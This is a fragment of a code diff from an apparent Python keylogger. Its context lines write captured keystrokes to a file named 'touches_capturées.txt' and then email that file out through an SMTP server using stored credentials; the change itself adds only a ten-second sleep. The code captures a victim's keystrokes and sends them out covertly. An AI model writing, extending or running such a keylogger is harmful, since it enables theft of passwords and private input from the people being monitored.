@@ -103,3 +103,4 @@ with open('C:/Temp/touches_capturées.txt', 'w') as file:
         file.write(f'{touche}\n')
 
 send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path)
+time.sleep(10)
